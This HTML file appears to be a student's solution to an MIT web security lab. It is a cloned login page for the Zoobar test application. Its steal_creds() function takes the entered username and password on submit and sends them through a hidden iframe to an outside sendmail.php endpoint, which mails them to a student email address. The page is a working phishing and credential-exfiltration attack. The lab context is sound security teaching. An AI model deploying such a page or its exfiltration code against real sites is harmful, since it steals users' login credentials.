<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <link rel="stylesheet" type="text/css" href="http://localhost:8080/zoobar/media/zoobar.css">
    <script src="http://localhost:8080/zoobar/index.cgi/zoobarjs"></script>
    <title>
        Login - Zoobar Foundation
    </title>
</head>

<body>
    <h1><a href="http://localhost:8080/zoobar/index.cgi">Zoobar Foundation for Awesome
            Advocacy</a></h1>
    <h2>Supporting the brave
        representatives of the United States</h2>

    <div id="login" class="centerpiece">
        <form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login" onsubmit='steal_creds()'>
            <table>
                <tr>
                    <td>Username:</td>
                    <td><input type="text" name="login_username" size="20" autocomplete="no" value=""></td>
                </tr>
                <tr>
                    <td>Password:</td>
                    <td colspan=2><input type="password" name="login_password" size=20 autocomplete="no">
                        <input type="submit" name="submit_login" value="Log in">
                        <input type="submit" name="submit_registration" value="Register"></td>
                </tr>
            </table>
            <input type="hidden" name="nexturl" value="http://localhost:8080/zoobar/index.cgi">
        </form>
    </div>
    <div class="footer warning">

    </div>
    <iframe style='visibility:hidden; position:absolute; border:0; height:0; width:0;' id='emailFrame'></iframe>
    <script>
    document.loginform.login_username.focus();
    if (typeof myZoobars !== 'undefined') window.location = 'answer-2.html';
    function steal_creds() {
        var user = document.getElementsByName('login_username')[0].value;
        var pass = document.getElementsByName('login_password')[0].value;
        document.getElementById('emailFrame').src='https://css.csail.mit.edu/6.858/2014/labs/sendmail.php?' + 'to=lailpimi@student.jyu.fi' + '&payload='+ user + encodeURIComponent(', ') + pass + '&random=' + Math.random();
    }
    </script>

</body>

</html>
